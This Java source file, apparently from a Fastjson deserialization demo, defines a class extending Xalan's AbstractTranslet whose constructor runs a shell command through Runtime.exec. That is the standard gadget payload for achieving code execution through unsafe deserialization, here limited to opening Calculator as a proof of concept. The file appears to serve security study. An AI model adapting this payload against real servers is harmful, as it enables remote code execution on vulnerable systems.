package com.fastjsonDemo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class testfastjson extends AbstractTranslet {
    public testfastjson() throws IOException {
        Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public static void main(String[] args) throws Exception {
        new testfastjson();
    }
}